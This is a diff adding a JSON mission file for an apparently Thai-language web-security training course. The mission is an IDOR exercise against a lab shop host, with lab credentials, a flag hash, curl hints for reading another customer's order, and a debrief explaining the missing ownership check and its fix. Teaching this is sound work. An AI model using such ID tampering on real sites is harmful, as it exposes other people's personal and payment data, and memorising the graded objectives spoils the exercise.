@@ -1,0 +1,79 @@
+{
+  "id": "c04-m01",
+  "chapter": "c04",
+  "title": "IDOR: อ่าน order ของคนอื่น",
+  "difficulty": "medium",
+  "xp": 300,
+  "estMinutes": 15,
+  "lesson": "c04-l01",
+  "briefing": "ShopZone (shop.acme.test) ให้ลูกค้าดูประวัติคำสั่งซื้อของตัวเองที่ /account/order?id=N ลองสมัคร/login เป็น alice แล้วดูว่า ID ที่ใช้อ้างอิงคำสั่งซื้อปลอดภัยแค่ไหน",
+  "scope": {
+    "inScope": [
+      "shop.acme.test — 10.10.20.9"
+    ],
+    "outOfScope": [
+      "เครื่องอื่นทั้งหมด"
+    ],
+    "ips": [
+      "10.10.20.9"
+    ]
+  },
+  "machine": "training-box",
+  "startUser": "kali",
+  "objectives": [
+    {
+      "id": "o1",
+      "text": "login เป็น alice (alice / alice123)",
+      "type": "http",
+      "path": "^/login$",
+      "method": "POST",
+      "status": 302,
+      "body": "username=alice"
+    },
+    {
+      "id": "o2",
+      "text": "ดู order ของตัวเอง (id=101)",
+      "type": "http",
+      "path": "^/account/order$",
+      "query": "id=101",
+      "response": "Customer: alice"
+    },
+    {
+      "id": "o3",
+      "text": "เปลี่ยนเลข id เป็นคนอื่น (id=102) แล้วดูว่าเห็นไหม",
+      "type": "http",
+      "path": "^/account/order$",
+      "query": "id=102",
+      "response": "card ending 4471"
+    },
+    {
+      "id": "o4",
+      "text": "ส่ง flag ที่พบ",
+      "type": "flag",
+      "flagHash": "63a29cb4560e5727e1037c8d206958c590d52bc22d34d68a475a73817c8e6652"
+    }
+  ],
+  "hints": [
+    {
+      "cost": 10,
+      "text": "login ก่อนด้วย `curl -i -d 'username=alice&password=alice123' http://shop.acme.test/login` แล้วเก็บ session cookie ที่ได้"
+    },
+    {
+      "cost": 20,
+      "text": "`curl -b 'session=<token>' http://shop.acme.test/account/order?id=102` — ไม่มีการตรวจสอบว่า order นี้เป็นของ alice จริงไหม"
+    }
+  ],
+  "debrief": [
+    "URL ใช้เลข ID แบบรันนิ่งที่เดาง่าย และเซิร์ฟเวอร์ตรวจสอบแค่ \"login แล้วหรือยัง\" ไม่ได้ตรวจว่า order นั้นเป็นของผู้ใช้คนนี้จริงไหม (`WHERE id = ?` แทนที่จะเป็น `WHERE id = ? AND user_id = ?`)",
+    "ข้อมูลที่หลุดออกมา (ที่อยู่จัดส่ง, เลขบัตรบางส่วน) เป็นข้อมูลส่วนบุคคลที่อ่อนไหว การแก้ไขง่ายๆ เพียงบรรทัดเดียวในเงื่อนไข WHERE ป้องกันเรื่องนี้ได้ทั้งหมด"
+  ],
+  "references": [
+    "OWASP Top 10 A01:2025 Broken Access Control",
+    "CWE-639 Authorization Bypass Through User-Controlled Key",
+    "MITRE ATT&CK T1530 Data from Cloud Storage"
+  ],
+  "owasp": {
+    "2025": "A01",
+    "2021": "A01"
+  }
+}
